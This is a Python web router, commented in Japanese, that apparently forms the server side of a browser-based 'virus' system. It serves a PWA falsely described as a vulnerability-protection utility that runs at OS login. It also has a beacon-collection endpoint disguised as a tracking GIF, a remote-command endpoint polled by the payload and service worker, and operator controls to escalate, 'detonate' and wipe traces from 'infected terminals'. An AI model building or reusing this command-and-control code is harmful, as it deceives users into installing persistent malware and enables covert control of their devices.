    resp = _render("virus_singularity.html", request, code=code, sid=sid, hit=hid,
                   link=dict(row), ref=ref, level=lv,
                   level_label=_SG_LEVEL_LABEL.get(lv, ""),
                   manifest=base + "/manifest.json?n=" + quote_plus(app_name),
                   icon192=base + "/icon-192.png",
                   icon512=base + "/icon-512.png",
                   app_name=app_name,
                   cfg_json=json.dumps(cfg, ensure_ascii=False),
                   worker_json=json.dumps(_SG_WORKER),
                   payload=_SG_PAYLOAD)
    # crossOriginIsolated を成立させ、SharedArrayBuffer / Atomics.wait を確実に使えるようにする
    resp.headers["Cross-Origin-Opener-Policy"] = "same-origin"
    resp.headers["Cross-Origin-Embedder-Policy"] = "require-corp"
    return resp


# --- ルート宣言順は厳守（4セグメントの literal を {sid} より前に） ---

@router.get("/v/{code}/sg/sw.js")
def sg_sw(code: str):
    return Response(_SG_SW, media_type="application/javascript",
                    headers={"Service-Worker-Allowed": "/", "Cache-Control": "no-store",
                            "Cross-Origin-Opener-Policy": "same-origin",
                            "Cross-Origin-Embedder-Policy": "require-corp"})


@router.get("/v/{code}/sg/manifest.json")
def sg_manifest(code: str, name: str = ""):
    base = f"/v/{code}/sg"
    app = (name or os.getenv("SG_APP_NAME") or _SG_APP_NAME)[:40]
    if _SG_PIL:
        icons = [
            {"src": base + "/icon-192.png", "sizes": "192x192",
             "type": "image/png", "purpose": "any"},
            {"src": base + "/icon-512.png", "sizes": "512x512",
             "type": "image/png", "purpose": "any"},
            {"src": base + "/icon-512.png", "sizes": "512x512",
             "type": "image/png", "purpose": "maskable"},
        ]
    else:
        icons = [{"src": base + "/icon.svg", "sizes": "any",
                  "type": "image/svg+xml", "purpose": "any maskable"}]
    man = {
        "id": base,
        "name": app,
        "short_name": app[:12],
        "description": "脆弱性の監視と保護を行います。",
        "start_url": base + "?i=1&w=0",
        "scope": base,
        "display": "standalone",
        "display_override": ["window-controls-overlay", "standalone", "minimal-ui"],
        "background_color": "#05070a",
        "theme_color": "#05070a",
        "orientation": "any",
        "categories": ["utilities", "productivity"],
        "launch_handler": {"client_mode": "focus-existing"},
        "handle_links": "preferred",
        "run_on_os_login": {"mode": "windowed"},
        "icons": icons,
        "shortcuts": [
            {"name": "特異点 (L5)", "short_name": "L5",
             "url": base + "?level=5", "icons": icons[:1]},
            {"name": "偵察 (L0)", "short_name": "L0", "url": base + "?level=0"},
            {"name": "消去 (wipe)", "short_name": "wipe", "url": base + "?wipe=1"},
        ],
        "protocol_handlers": [{"protocol": "web+sg", "url": base + "?ref=%s"}],
        "file_handlers": [{"action": base,
                           "accept": {"application/x-singularity": [".sg"]}}],
        "prefer_related_applications": False,
    }
    return JSONResponse(man, headers={
        "Content-Type": "application/manifest+json; charset=utf-8",
        "Cache-Control": "no-store",
    })


@router.get("/v/{code}/sg/icon-192.png")
def sg_icon192():
    d = _sg_icon(192)
    if not d:
        return Response(_SG_ICON_SVG, media_type="image/svg+xml")
    return Response(d, media_type="image/png",
                    headers={"Cache-Control": "public, max-age=86400"})


@router.get("/v/{code}/sg/icon-512.png")
def sg_icon512():
    d = _sg_icon(512)
    if not d:
        return Response(_SG_ICON_SVG, media_type="image/svg+xml")
    return Response(d, media_type="image/png",
                    headers={"Cache-Control": "public, max-age=86400"})


@router.get("/v/{code}/sg/icon.svg")
def sg_icon_svg():
    return Response(_SG_ICON_SVG, media_type="image/svg+xml",
                    headers={"Cache-Control": "public, max-age=86400"})


@router.get("/v/{code}/sg/c")
async def sg_collect_get(code: str, request: Request, sid: str = "", d: str = ""):
    """画像ピクセル経路（GET）。+ が空白に潰れるので戻す。"""
    owner = _owner(code)
    if not owner:
        return Response(_GIF1, media_type="image/gif")
    if d:
        try:
            d = d.replace(" ", "+")
            body = json.loads(base64.b64decode(d + "=" * (-len(d) % 4)).decode("utf-8"))
        except Exception:
            body = {}
        if isinstance(body, dict) and body:
            try:
                _sg_ingest(owner, code, body, sid or str(body.get("sid") or ""))
            except Exception:
                pass
    return Response(_GIF1, media_type="image/gif")


@router.post("/v/{code}/sg/c")
async def sg_collect(code: str, request: Request):
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    try:
        body = await request.json()
    except Exception:
        body = {}
    if not isinstance(body, dict):
        body = {}
    try:
        n = _sg_ingest(owner, code, body, str(body.get("sid") or ""))
    except Exception:
        n = 0
    return {"ok": 1, "n": n, "server": _now()}


@router.get("/v/{code}/sg/cmd")
def sg_cmd(code: str):
    """ペイロード／Service Worker が拾う遠隔コマンド。"""
    owner = _owner(code)
    if not owner:
        return {"ok": 0}
    c = _db(owner)
    row = _link(c, code)
    c.close()
    if not row:
        return {"ok": 0}
    return {"ok": 1,
            "level": int(_val(row, "level", 1) or 0),
            "fire": int(_val(row, "firing", 1) or 0),
            "wipe": int(_val(row, "wipe_seq", 0) or 0),
            "server": _now()}


@router.get("/v/{code}/sg/worker.js")
def sg_worker(code: str):
    return Response(_SG_WORKER, media_type="application/javascript",
                    headers={"Cache-Control": "no-store"})


@router.get("/v/{code}/sg/{sid}")
def sg_child(code: str, sid: str, request: Request):
    return _sg_land(code, request, sid=sid)


@router.get("/v/{code}/sg")
def sg_root(code: str, request: Request):
    return _sg_land(code, request)


# --- 監視室からの制御 ---

@router.post("/vp/{code}/level")
def sg_level(code: str, level: str = Form("1"), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    try:
        lv = max(0, min(5, int(level)))
    except Exception:
        lv = 1
    c = _db(owner)
    c.execute("UPDATE virus_links SET level=?, firing=1 WHERE code=?", (lv, code))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?lvl=" + str(lv), status_code=303)


@router.post("/vp/{code}/freeze")
def sg_freeze(code: str, freeze: str = Form(""), u=Depends(_auth)):
    owner = tenancy.get_current() or u
    fz = freeze if freeze in ("off", "soft", "hard") else ""
    c = _db(owner)
    c.execute("UPDATE virus_links SET freeze=? WHERE code=?", (fz, code))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code, status_code=303)


@router.post("/vp/{code}/detonate")
def sg_detonate(code: str, u=Depends(_auth)):
    """最終形態へ即時移行（レベル5・稼働）。"""
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET level=5, firing=1, freeze='' WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?boom=1", status_code=303)


@router.post("/vp/{code}/wipe")
def sg_wipe(code: str, u=Depends(_auth)):
    """感染端末の痕跡を完全消去させる（SWが navigate で叩き起こす）。"""
    owner = tenancy.get_current() or u
    c = _db(owner)
    c.execute("UPDATE virus_links SET wipe_seq=COALESCE(wipe_seq,0)+1 WHERE code=?", (code,))
    c.commit()
    c.close()
    return RedirectResponse("/vp/" + code + "?wiped=1", status_code=303)